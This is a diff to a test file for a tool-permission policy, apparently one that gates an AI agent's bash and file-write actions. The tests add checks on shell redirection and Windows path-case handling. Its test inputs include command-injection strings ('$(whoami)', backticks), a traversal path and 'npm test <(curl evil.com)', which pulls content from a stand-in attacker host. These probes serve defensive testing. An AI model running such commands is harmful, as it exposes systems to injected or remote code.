@@ -154,6 +154,10 @@ test('bash allow rules with wildcards reject chained or compound commands', () =
   assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test \n evil' } }, ctx), 'ask');
   assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test $(whoami)' } }, ctx), 'ask');
   assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status `whoami`' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test > out.txt' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test >> out.txt' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test < in.txt' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test <(curl evil.com)' } }, ctx), 'ask');
 });
 
 test('file pattern matching canonicalizes absolute paths and directory traversals', () => {
@@ -171,6 +175,18 @@ test('file pattern matching canonicalizes absolute paths and directory traversal
   assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'dist/../src/index.ts' } }, ctx), 'deny');
   // Absolute path inside workspace resolving into src/ is denied
   assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: join(cwd, 'src', 'index.ts') } }, ctx), 'deny');
+
+  // Case-insensitive drive letter/prefix matching on Windows
+  if (process.platform === 'win32') {
+    const toggledCwd = cwd.startsWith('c:') || cwd.startsWith('C:')
+      ? (cwd.startsWith('c:') ? 'C:' + cwd.slice(2) : 'c:' + cwd.slice(2))
+      : cwd;
+    const winCtx = {
+      cwd: toggledCwd,
+      projectRules: { deny: ['write_file(src/*)'] },
+    };
+    assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: join(cwd, 'src', 'index.ts') } }, winCtx), 'deny');
+  }
 });
 
 test('tool aliases are normalized in policy matching', () => {
